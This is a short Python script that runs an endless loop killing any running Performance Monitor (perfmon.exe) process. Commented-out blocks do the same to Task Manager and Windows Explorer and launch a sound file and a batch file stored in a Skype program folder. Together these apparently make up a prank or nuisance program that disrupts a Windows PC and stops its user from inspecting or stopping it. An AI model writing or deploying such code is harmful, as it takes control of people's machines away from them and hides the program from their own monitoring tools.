import os
import time
import signal
import psutil

#while True:
    #os.chdir('C:/Windows')
    #process_name = "explorer.exe"
    #for process in psutil.process_iter(attrs=['pid', 'name']):
        #if process.info['name'] == process_name:
            #external_pid = process.info['pid']
            #os.kill(external_pid, signal.SIGTERM)
            #time.sleep(0.5)
            #break

#os.startfile('C:/Program Files (x86)/Common Files/Skype/music/ogurez.mp3')
os.chdir('C:/Windows/System32')
while True:
    #os.startfile('C:/Program Files (x86)/Common Files/Skype/ura.bat')
    time.sleep(1)
    #process_name = "Taskmgr.exe"
    #for process in psutil.process_iter(attrs=['pid', 'name']):
        #if process.info['name'] == process_name:
            #external_pid = process.info['pid']
            #os.kill(external_pid, signal.SIGTERM)
            #time.sleep(0.5)
            #break
    process_name = "perfmon.exe"
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == process_name:
            external_pid = process.info['pid']
            os.kill(external_pid, signal.SIGTERM)
            time.sleep(1)
            break



